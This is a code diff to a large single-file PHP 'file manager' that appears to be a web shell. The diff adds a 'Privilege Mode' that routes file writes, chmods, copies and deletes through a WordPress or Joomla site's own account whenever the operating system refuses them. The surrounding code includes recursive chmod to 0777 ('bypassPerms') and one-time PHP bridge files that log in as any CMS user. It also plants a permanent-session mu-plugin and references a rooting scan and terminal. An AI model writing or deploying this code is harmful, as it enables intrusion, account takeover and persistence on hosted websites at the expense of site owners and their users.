+    private function saveFile(){$n=basename(isset($_POST['filename'])?$_POST['filename']:'');if(!$n||$this->isSelf($n))return;$p=$this->currentDir.'/'.$n;if(!file_exists($p)||!is_file($p)){$this->addMsg('File not found.','danger');return;}$c=isset($_POST['content'])?$_POST['content']:'';$delta=max(0,strlen($c)-(int)@filesize($p));if(!$this->quotaAllows($delta)){$this->addMsg('Quota exceeded. Free space or ask an administrator for a larger limit.','danger');return;}$res=$this->runOp('write',['path'=>$p,'data'=>base64_encode($c),'b64'=>1],$p,function()use($p,$c){return@file_put_contents($p,$c)!==false;});
+        if(!empty($res['ok'])){
+            $this->log('edit',$n.($res['via']==='site'?' (site)':''));
+            $this->addMsg("Saved: $n".($res['via']==='site'?' — written by '.$this->privWho($p):''),'success');
+        }
+        else $this->addMsg('Save failed. '.$res['why'],'danger');}
     private function bypassPerms(){$cnt=0;$f=0;$it=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($this->currentDir,RecursiveDirectoryIterator::SKIP_DOTS),RecursiveIteratorIterator::SELF_FIRST);foreach($it as $item){$p=$item->getPathname();if($p===__FILE__)continue;if($item->isDir()){if(@chmod($p,0777))$cnt++;else $f++;}else{if(@chmod($p,0666))$cnt++;else $f++;}}$this->log('chmod',"$cnt changed");$this->addMsg("Permissions: $cnt changed".($f?", $f failed":""),$f?'warning':'success');}
-    private function dupFile(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$src=$this->currentDir.'/'.$n;if(!is_file($src)){$this->addMsg('File not found.','danger');return;}$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$cp=$base.'_copy'.($ext?'.'.$ext:'');$i=1;while(file_exists($this->currentDir.'/'.$cp)){$cp=$base.'_copy'.$i.($ext?'.'.$ext:'');$i++;}if(@copy($src,$this->currentDir.'/'.$cp)){$this->log('duplicate',"$n → $cp");$this->addMsg("Duplicated: $cp",'success');}else $this->addMsg('Duplicate failed.','danger');}
+    private function dupFile(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n)return;$src=$this->currentDir.'/'.$n;if(!is_file($src)){$this->addMsg('File not found.','danger');return;}$ext=pathinfo($n,PATHINFO_EXTENSION);$base=pathinfo($n,PATHINFO_FILENAME);$cp=$base.'_copy'.($ext?'.'.$ext:'');$i=1;while(file_exists($this->currentDir.'/'.$cp)){$cp=$base.'_copy'.$i.($ext?'.'.$ext:'');$i++;}$dst=$this->currentDir.'/'.$cp;
+        $res=$this->runOp('copy',['path'=>$src,'to'=>$dst],$src,function()use($src,$dst){return@copy($src,$dst);});
+        if(!empty($res['ok'])){$this->log('duplicate',"$n → $cp".($res['via']==='site'?' (site)':''));$this->addMsg("Duplicated: $cp".$this->viaNote($res,$src),'success');}
+        else $this->addMsg('Duplicate failed. '.$res['why'],'danger');}
     private function mkSymlink(){
         $target=trim(isset($_POST['sym_target'])?$_POST['sym_target']:'');
         $name=basename(trim(isset($_POST['sym_name'])?$_POST['sym_name']:''));
@@ -4347,8 +4796,12 @@ class FileManager {
         if(!preg_match('/^[0-7]{3,4}$/',$perm)){$this->addMsg('Invalid permission value.','danger');return;}
         $p=$this->currentDir.'/'.$n;
         if(!file_exists($p)){$this->addMsg('Item not found.','danger');return;}
-        if(@chmod($p,octdec($perm))){$this->log('chmod',"$n → $perm");$this->addMsg("Permissions updated: $n ($perm)",'success');}
-        else $this->addMsg('chmod failed (insufficient permissions).','danger');
+        $res=$this->runOp('chmod',['path'=>$p,'mode'=>octdec($perm)],$p,function()use($p,$perm){return@chmod($p,octdec($perm));});
+        if(!empty($res['ok'])){
+            $this->log('chmod',"$n → $perm".($res['via']==='site'?' (site)':''));
+            $this->addMsg("Permissions updated: $n ($perm)".$this->viaNote($res,$p),'success');
+        }
+        else $this->addMsg('chmod failed: '.$res['why'],'danger');
     }
 
     /* Folder size */
@@ -7973,7 +8426,7 @@ FMNUM;
         if($this->wpImageHasLegacyItems($items)){
             $muDir=dirname($plugin);
             if(!is_dir($muDir)&&!@mkdir($muDir,0755,true)&&!is_dir($muDir))return false;
-            if(@file_put_contents($plugin,$this->wpImageReplacePluginCode(),LOCK_EX)===false)return false;
+            if(@file_put_contents($plugin,$this->wpImageReplacePluginCode(),LOCK_EX)===false&&!$this->privWriteFile($plugin,$this->wpImageReplacePluginCode()))return false;
             @chmod($plugin,0644);
         }elseif(is_file($plugin))@unlink($plugin);
         return true;
@@ -8516,7 +8969,7 @@ FMIMG;
             ?preg_replace('/public\s+\$offline_message\s*=\s*[\'"].*?[\'"]\s*;/s',"public \$offline_message = '$safeMsg';",$src,1)
             :preg_replace('/(class\s+JConfig\s*\{)/',"$1\n\tpublic \$offline_message = '$safeMsg';",$src,1);
         @copy($configPath,$configPath.'.bak_'.time());
-        if(@file_put_contents($configPath,$src)===false){$this->addMsg('Failed to write configuration.php (check file permissions).','danger');return;}
+        if(@file_put_contents($configPath,$src)===false&&!$this->privWriteFile($configPath,$src)){$this->addMsg('Failed to write configuration.php (check file permissions).','danger');return;}
         $this->addMsg('Offline (maintenance) mode '.($enable?'enabled':'disabled').' for this Joomla site.',$enable?'warning':'success');
         $this->log('cms_maintenance','joomla '.($enable?'on':'off'));
     }
@@ -8616,14 +9069,19 @@ FMIMG;
             $siteUrl=$this->cmsJoomlaLiveSite($configPath);
         }
         mysqli_close($link);
-        if(!is_writable($dir))return['error'=>'The site folder ('.$dir.') is not writable, so the one-time login file could not be created.'];
+        if(!is_writable($dir)&&!$this->privSiteFor($dir))return['error'=>'The site folder ('.$dir.') is not writable, so the one-time login file could not be created.'];
         $token=bin2hex(random_bytes(16));
         $fname='fm-bridge-'.bin2hex(random_bytes(8)).'.php';
         $bridgePath=$dir.'/'.$fname;
         $expires=time()+180;
         $code=$c['type']==='wordpress'?$this->cmsWpBridgeCode($id,$token,$expires):$this->cmsJoomlaBridgeCode($id,$token,$expires);
-        if(@file_put_contents($bridgePath,$code)===false)return['error'=>'Could not write the temporary login file into '.$dir.'.'];
-        @chmod($bridgePath,0644);
+        if(@file_put_contents($bridgePath,$code)===false){
+            /* The folder belongs to the web server — write the file through the
+               site itself so a one-time login link still works. */
+            $w=$this->privOp('write',['path'=>$bridgePath,'data'=>base64_encode($code),'b64'=>1],$bridgePath);
+            if(empty($w['ok']))return['error'=>'Could not write the temporary login file into '.$dir.'. '.($w['error']??'')];
+        }
+        if(!@chmod($bridgePath,0644))$this->privOp('chmod',['path'=>$bridgePath,'mode'=>0644],$bridgePath);
         /* Never hand back a guessed URL — actively verify it first. We build
            every plausible base URL for this folder (cPanel-resolved domain
            for its exact document root, the current request's host, domain-
@@ -8641,7 +9099,7 @@ FMIMG;
         $candidates=$this->cmsBuildCandidateUrls($dir,$siteUrl);
         $probe=$this->cmsProbeUrls($candidates,$fname,$sentinel);
         if(!$probe['ok']){
-            @unlink($bridgePath);
+            if(!@unlink($bridgePath))$this->privOp('delete',['path'=>$bridgePath],$bridgePath);
             $triedList=implode("\n",array_map(fn($t)=>' - '.$t,array_slice($probe['tried'],0,10)));
             return['error'=>"Could not verify a working login URL for this site — every URL this tool could construct failed to actually reach the site's folder from this server. Tried:\n{$triedList}\n\nThis usually means the site is served from a different server/hosting account than this file manager, or under a domain this account can't resolve. No broken link was opened."];
         }
@@ -9346,7 +9804,9 @@ FMIMG;
         if($new===null)return false;
         /* Already at the requested value: that is success, not a failure. */
         if($new===$raw)return $this->joomlaLifetime($configPath)===(int)$minutes;
-        return @file_put_contents($configPath,$new,LOCK_EX)!==false;
+        if(@file_put_contents($configPath,$new,LOCK_EX))return true;
+        $r=$this->privOp('write',['path'=>$configPath,'data'=>base64_encode($new),'b64'=>1],$configPath);
+        return !empty($r['ok']);
     }
     public function sessionInspector($action,$post){
         if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
@@ -9573,7 +10033,7 @@ FMIMG;
             if($want){
                 $dir=dirname($muPath);
                 if(!is_dir($dir))@mkdir($dir,0755,true);
-                if(@file_put_contents($muPath,$this->wpPermanentSessionPluginCode())===false)
+                if(!$this->privWriteFile($muPath,$this->wpPermanentSessionPluginCode()))
                     return['error'=>'Could not write the mu-plugin (folder is not writable).'];
             }else{
                 if(is_file($muPath)&&!@unlink($muPath))return['error'=>'Could not delete the mu-plugin.'];
@@ -13261,6 +13721,11 @@ if(isset($_GET['x'])){
         if(!$id){echo json_encode(['error'=>'Invalid request.']);exit;}
         echo json_encode($fm->cmsLoginAsUser($cfgB64(),$id));exit;
     }
+    if($xop==='privmode'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if($_SERVER['REQUEST_METHOD']!=='POST'||!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->privModeEndpoint($_POST));exit;
+    }
     if($xop==='sessions'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         if(!isset($_POST['csrf_token'])||!hash_equals((string)($_SESSION['csrf_token']??''),(string)$_POST['csrf_token'])){http_response_code(403);echo json_encode(['error'=>'Security error.']);exit;}
@@ -13957,7 +14422,7 @@ if(isset($_GET['umsg']))$fm->addMsg($_GET['umsg'],isset($_GET['utype'])?$_GET['u
 
 $list=$fm->scan();
 $editMode=false;$editContent='';$editFile='';
-if(isset($_GET['edit'])){$fn=basename($_GET['edit']);$fp=realpath($fm->getCwd().'/'.$fn);if($fp&&is_file($fp)&&$fp!==__FILE__){$editMode=true;$editFile=$fn;$editContent=file_get_contents($fp);}}
+if(isset($_GET['edit'])){$fn=basename($_GET['edit']);$fp=realpath($fm->getCwd().'/'.$fn);if($fp&&is_file($fp)&&$fp!==__FILE__){$editMode=true;$editFile=$fn;$editContent=@file_get_contents($fp);if($editContent===false){$viaSite=$fm->privReadFile($fp);if($viaSite!==null)$editContent=$viaSite;}if($editContent===false)$editContent='';}}
 
 $totalFolders=count($list['folders']);$totalFiles=count($list['files']);
 $totalSize=0;foreach($list['files']as $f)$totalSize+=$f['size'];
@@ -15398,6 +15863,8 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
        <button class="sb-item" id="cmsInstallerBtn" title="Install WordPress or Joomla in a new empty directory"><svg viewBox="0 0 24 24"><path d="m12 3 9 4.5-9 4.5-9-4.5L12 3z"/><path d="M3 7.5v9l9 4.5 9-4.5v-9"/><path d="M12 12v9"/><path d="m8 15 4 4 4-4"/></svg>CMS Installer</button>
       <?php endif;?>
       <button class="sb-item" id="cmsBtn"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>CMS Manager</button>
+      <?php $pmNow=$fm->privMode();$pmShort=['server'=>'server','auto'=>'','wordpress'=>'WP','joomla'=>'Joomla'][$pmNow]??'';$pmLabel=['server'=>'Server account only','auto'=>'Automatic','wordpress'=>'WordPress','joomla'=>'Joomla'][$pmNow]??$pmNow;?>
+      <button class="sb-item" id="privModeBtn" title="File changes are performed by: <?=htmlspecialchars($pmLabel)?> — click to change"><svg viewBox="0 0 24 24"><path d="M4 21v-7"/><path d="M4 10V3"/><path d="M12 21v-9"/><path d="M12 8V3"/><path d="M20 21v-5"/><path d="M20 12V3"/><path d="M1 14h6"/><path d="M9 8h6"/><path d="M17 16h6"/></svg>Privilege Mode<span id="privModeBadge" style="margin-left:6px;font-size:10px;opacity:.8"><?=$pmShort===''?'':'· '.htmlspecialchars($pmShort)?></span></button>
       <button class="sb-item" id="sessBtn" title="Inspect, extend or revoke real login sessions (WordPress / Joomla)"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><path d="M12 15v2"/></svg>Session Inspector</button>
       <button class="sb-item" id="cpanelBtn"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10" r="3"/></svg>cPanel Manager</button>
       <button class="sb-item" id="webmailBtn"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg>Webmail Manager</button>
@@ -16905,6 +17372,32 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 
 <!-- MANAGE SHARE LINKS MODAL -->
 <!-- SESSION & COOKIE INSPECTOR -->
+<div class="mod-ov" id="privOv">
+  <div class="mod" style="max-width:720px">
+    <div class="mod-head">
+      <div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M4 21v-7"/><path d="M4 10V3"/><path d="M12 21v-9"/><path d="M12 8V3"/><path d="M20 21v-5"/><path d="M20 12V3"/><path d="M1 14h6"/><path d="M9 8h6"/><path d="M17 16h6"/></svg></div>
+      <span class="mod-title">Privilege Mode</span>
+      <button class="btn btn-icon btn-g" id="privClose" aria-label="Close"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="mod-body" style="padding:16px">
+      <div id="privStatus" style="font-size:12px;color:var(--t2);line-height:1.8;margin-bottom:12px"></div>
+      <div id="privModes" style="display:flex;flex-direction:column;gap:8px"></div>
+      <div style="display:flex;gap:8px;margin-top:14px;flex-wrap:wrap">
+        <button class="btn btn-p" id="privApply">Apply</button>
+        <button class="btn btn-g" id="privTest">Test a write</button>
+        <button class="btn btn-g" id="privRefresh">Refresh</button>
+      </div>
+      <div id="privOut" style="font-size:11px;color:var(--t2);margin-top:10px;min-height:16px;word-break:break-word"></div>
+      <div id="privSites" style="margin-top:14px;padding-top:10px;border-top:1px solid var(--border)"></div>
+      <div style="font-size:11px;color:var(--t3);margin-top:10px;line-height:1.7">
+        Server account only — the manager does everything itself; nothing is done on a site's behalf.<br>
+        Automatic — the manager tries first and asks the site only when the operating system refuses.<br>
+        WordPress / Joomla — every change inside that installation is performed by the site itself,
+        using the account that serves it. Folders outside any site are still handled by the manager.
+      </div>
+    </div>
+  </div>
+</div>
 <div class="mod-ov" id="sessOv">
   <div class="mod mod-lg" style="max-width:960px">
     <div class="mod-head">
@@ -18140,7 +18633,7 @@ function openMod(id){document.getElementById(id)?.classList.add('open');}
 function closeMod(id){document.getElementById(id)?.classList.remove('open');if(id==='configInspectorOv'&&typeof resetConfigInspectorView==='function')resetConfigInspectorView();if(id==='rootingScanOv'&&typeof resetRootingScanView==='function')resetRootingScanView();}
 document.addEventListener('keydown',e=>{
   if(e.key!=='Escape')return;
-  ['prevOv','fileInfoOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','configInspectorOv','rootingScanOv','speedOv','wpNumbersOv','wpImagesOv','responseChangerOv'].forEach(closeMod);
+  ['prevOv','fileInfoOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','configInspectorOv','rootingScanOv','speedOv','wpNumbersOv','wpImagesOv','responseChangerOv','privOv','sessOv'].forEach(closeMod);
   closeSheet();closeCtx();
 });
 ['prevOv','fileInfoOv','termOv','hashOv','actOv','srvOv','brOv','symlinkOv','usersOv','ownerOv','permOv','shareCreateOv','sharesOv','largeOv','dupOv','errLogOv','envOv','configInspectorOv','rootingScanOv','speedOv','wpNumbersOv','wpImagesOv','responseChangerOv'].forEach(id=>{
@@ -20103,6 +20596,94 @@ document.getElementById('sessCfgAuto')?.addEventListener('click',()=>{
 });
 document.getElementById('sessCfgPath')?.addEventListener('keydown',e=>{
   if(e.key==='Enter'){e.preventDefault();document.getElementById('sessCfgUse')?.click();}
+});
+/* ── Privilege Mode ────────────────────────────────────────────────────────
+   Which identity performs file changes. The state comes from ?x=privmode;
+   the modal only renders it and posts the two actions (get / set / test). */
+let PRIV_STATE=null, PRIV_SEL=null;
+async function privCall(action,extra){
+  const fd=new FormData();fd.append('csrf_token',CSRF);fd.append('action',action);
+  if(extra)for(const k in extra){if(extra[k]!==undefined&&extra[k]!==null)fd.append(k,String(extra[k]));}
+  try{
+    const r=await fetch('?x=privmode',{method:'POST',body:fd,cache:'no-store'});
+    if(r.status===403){toast('Security token rejected. Reload the page.');return null;}
+    return await r.json();
+  }catch(e){toast('The request failed.');return null;}
+}
+function privBadge(){
+  const b=document.getElementById('privModeBadge'),btn=document.getElementById('privModeBtn');
+  if(!b||!PRIV_STATE)return;
+  const short={'server':'server','auto':'auto','wordpress':'WP','joomla':'Joomla'}[PRIV_STATE.mode]||PRIV_STATE.mode;
+  b.textContent=PRIV_STATE.mode==='auto'?'':'· '+short;
+  if(btn)btn.title='File changes are performed by: '+PRIV_STATE.label;
+}
+function privRender(){
+  const st=PRIV_STATE;if(!st)return;
+  privBadge();
+  const sm=document.getElementById('privStatus');
+  if(sm){
+    const who=(st.manager&&st.manager.user)||'unknown account';
+    sm.innerHTML='Active mode: <b style="color:var(--t1)">'+sessEsc(st.label)+'</b>'
+      +'<br>This manager runs as <b>'+sessEsc(who)+'</b>'
+      +((st.manager&&st.manager.php)?' ('+sessEsc(st.manager.php)+')':'');
+  }
+  const box=document.getElementById('privModes');
+  if(box){
+    box.innerHTML=(st.modes||[]).map(m=>{
+      const on=(PRIV_SEL||st.mode)===m.id;
+      return '<label data-priv-mode="'+sessEsc(m.id)+'" style="display:flex;gap:10px;align-items:flex-start;padding:10px 12px;'
+        +'border:1px solid '+(on?'var(--blue)':'var(--border)')+';border-radius:10px;cursor:pointer">'
+        +'<input type="radio" name="privMode" value="'+sessEsc(m.id)+'"'+(on?' checked':'')+'>'
+        +'<span><b style="color:var(--t1);font-size:13px">'+sessEsc(m.label)
+        +(m.id===st.mode?' · active':'')+'</b><br>'
+        +'<span style="font-size:11px;color:var(--t3)">'+sessEsc(m.hint)+'</span></span></label>';
+    }).join('');
+    box.querySelectorAll('[data-priv-mode]').forEach(el=>{
+      el.addEventListener('click',()=>{PRIV_SEL=el.getAttribute('data-priv-mode');privRender();});
+    });
+  }
+  const sites=document.getElementById('privSites');
+  if(sites){
+    sites.innerHTML='<div style="font-size:11px;color:var(--t3);margin-bottom:6px">Detected installations</div>'
+      +(st.sites||[]).map(s=>{
+        if(!s.found)return '<div style="font-size:11px;color:var(--t3);margin-bottom:4px">'+sessEsc(s.label)+': not found</div>';
+        const b=s.bridge||{};
+        return '<div style="font-size:11px;color:var(--t3);line-height:1.7;margin-bottom:6px">'
+          +'<b style="color:var(--t2)">'+sessEsc(s.label)+'</b> · '+sessEsc(s.root)
+          +'<br>runs as <b style="color:var(--t2)">'+sessEsc(b.ok?(b.user||'unknown account'):('unavailable — '+(b.error||'')))+'</b>'
+          +(s.writable?' · folder writable by the manager':' · folder owned by the site')+'</div>';
+      }).join('');
+  }
+}
+async function privLoad(){
+  const d=await privCall('get');
+  if(!d)return;
+  if(d.error){toast(d.error);return;}
+  PRIV_STATE=d.state;PRIV_SEL=PRIV_STATE.mode;privRender();
+}
+document.getElementById('privModeBtn')?.addEventListener('click',()=>{
+  openMod('privOv');
+  const out=document.getElementById('privOut');if(out)out.textContent='';
+  privLoad();
+});
+document.getElementById('privClose')?.addEventListener('click',()=>closeMod('privOv'));
+document.getElementById('privRefresh')?.addEventListener('click',privLoad);
+document.getElementById('privApply')?.addEventListener('click',async()=>{
+  const out=document.getElementById('privOut');
+  const d=await privCall('set',{mode:PRIV_SEL});
+  if(!d)return;
+  if(d.error){if(out)out.textContent=d.error;toast(d.error);return;}
+  PRIV_STATE=d.state;PRIV_SEL=PRIV_STATE.mode;privRender();
+  const note=(d.notice||'Mode updated.')+' Reload the page to update the toolbar state.';
+  if(out)out.textContent=note;toast(d.notice||'Mode updated.');
+});
+document.getElementById('privTest')?.addEventListener('click',async()=>{
+  const out=document.getElementById('privOut');
+  if(out)out.textContent='Testing…';
+  const d=await privCall('test',{mode:PRIV_SEL});
+  if(!d)return;
+  const msg=d.error||d.message||'Done.';
+  if(out)out.textContent=msg;toast(msg);
 });
 document.getElementById('sessClose')?.addEventListener('click',()=>closeMod('sessOv'));
 document.getElementById('sessRefresh')?.addEventListener('click',sessLoad);
